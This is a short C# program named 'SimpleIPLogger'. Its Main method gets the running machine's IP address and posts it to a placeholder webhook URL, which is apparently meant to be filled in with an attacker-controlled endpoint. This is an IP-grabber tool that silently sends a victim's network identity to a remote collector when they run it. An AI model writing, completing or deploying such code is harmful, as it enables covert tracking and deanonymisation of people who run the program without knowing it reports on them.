using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace SimpleIPLogger
{
    class Program
    {
        static void Main(string[] args)
        {
            string webhook = "__WEBHOOK__";
            var wbc = new WebClient();
            var Data = new NameValueCollection();
            Data["content"] = IPLogger.GetIp();
            wbc.UploadValues(webhook, Data);
        }
    }
}
